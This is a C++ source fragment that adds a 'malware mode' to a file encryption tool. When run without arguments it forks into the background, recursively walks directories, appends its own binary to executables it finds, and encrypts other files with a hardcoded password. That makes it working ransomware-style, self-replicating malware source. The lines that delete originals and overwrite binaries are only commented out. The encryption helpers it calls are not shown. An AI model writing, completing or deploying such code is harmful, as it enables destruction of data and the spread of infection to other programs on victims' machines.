static std::vector<uint8_t> rf(const std::string& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) throw std::runtime_error("Cannot open: " + p);
    return {std::istreambuf_iterator<char>(f), {}};
}

static void wf(const std::string& p, const std::vector<uint8_t>& d) {
    std::ofstream f(p, std::ios::binary);
    if (!f) throw std::runtime_error("Cannot create: " + p);
    f.write((const char*)d.data(), d.size());
}

// New: Self-replication logic to infect other executables
void infect_executable(const std::string& target_path, const std::vector<uint8_t>& self_binary) {
    try {
        // Check if the file is an executable (simplified check for Unix-like systems)
        struct stat st;
        if (stat(target_path.c_str(), &st) == 0 && (st.st_mode & S_IXUSR)) {
            // Read the target executable
            std::vector<uint8_t> target_data = rf(target_path);
            // Simple infection: Append our binary to the target (in a real scenario, this would be more sophisticated)
            std::vector<uint8_t> infected_data = target_data;
            infected_data.insert(infected_data.end(), self_binary.begin(), self_binary.end());
            // Write back the infected binary
            wf(target_path + ".infected", infected_data); // Write to a new file for simplicity
            std::cout << "Infected: " << target_path << " -> " << target_path + ".infected" << std::endl;
            // Optionally, replace the original file (commented out for safety)
            // unlink(target_path.c_str());
            // rename((target_path + ".infected").c_str(), target_path.c_str());
        }
    } catch (const std::exception& e) {
        std::cerr << "Infection failed for " << target_path << ": " << e.what() << std::endl;
    }
}

// New: Directory traversal to find files to encrypt or executables to infect
void traverse_and_process(const std::string& dir_path, const std::string& pass, const std::vector<uint8_t>& self_binary) {
    namespace fs = std::filesystem;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(dir_path)) {
            if (entry.is_regular_file()) {
                std::string path = entry.path().string();
                // Check if it's an executable for infection
                struct stat st;
                if (stat(path.c_str(), &st) == 0 && (st.st_mode & S_IXUSR)) {
                    infect_executable(path, self_binary);
                }
                // Encrypt non-executable files (avoid encrypting our own binary)
                if (path.find("encrypt_malware") == std::string::npos &&
                    path.find(".encrypted") == std::string::npos) {
                    try {
                        std::vector<uint8_t> data = rf(path);
                        std::vector<uint8_t> encrypted = do_enc(data, pass);
                        wf(path + ".encrypted", encrypted);
                        std::cout << "Encrypted file: " << path << " -> " << path + ".encrypted" << std::endl;
                        // Optionally remove original file (commented out for safety)
                        // unlink(path.c_str());
                    } catch (const std::exception& e) {
                        std::cerr << "Encryption failed for " << path << ": " << e.what() << std::endl;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Traversal error in " << dir_path << ": " << e.what() << std::endl;
    }
}

// Main function with malware mode
int main(int argc, char* argv[]) {
    std::string self_path = argv[0];
    std::vector<uint8_t> self_binary;
    try {
        self_binary = rf(self_path); // Read our own binary for self-replication
    } catch (const std::exception& e) {
        std::cerr << "Could not read self binary: " << e.what() << std::endl;
    }

    if (argc == 5) {
        // Standard mode (manual encryption/decryption as in original)
        std::string mode = argv[1], in = argv[2], out = argv[3], pass = argv[4];
        try {
            auto data = rf(in);
            if (mode == "enc") {
                auto r = do_enc(data, pass);
                wf(out, r);
                std::cout << "Encrypted: " << in << " -> " << out << " (" << r.size() << " bytes)\n";
            } else if (mode == "dec") {
                auto r = do_dec(data, pass);
                wf(out, r);
                std::cout << "Decrypted: " << in << " -> " << out << " (" << r.size() << " bytes)\n";
            } else {
                std::cerr << "Unknown mode\n";
                return 1;
            }
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << "\n";
            return 1;
        }
    } else {
        // Malware mode (auto-spread and encrypt)
        std::cout << "Running in malware mode: Spreading and encrypting files...\n";
        std::string pass = "hardcoded_malware_pass_123"; // Hardcoded password for encryption
        std::string target_dir = "."; // Start in current directory (can be changed to /home or others)

        // Optionally fork to run in background (Unix-like systems)
        if (fork() == 0) {
            setsid(); // Detach from terminal
            traverse_and_process(target_dir, pass, self_binary);
            exit(0);
        } else {
            std::cout << "Malware process started in background.\n";
        }
    }
    return 0;
}
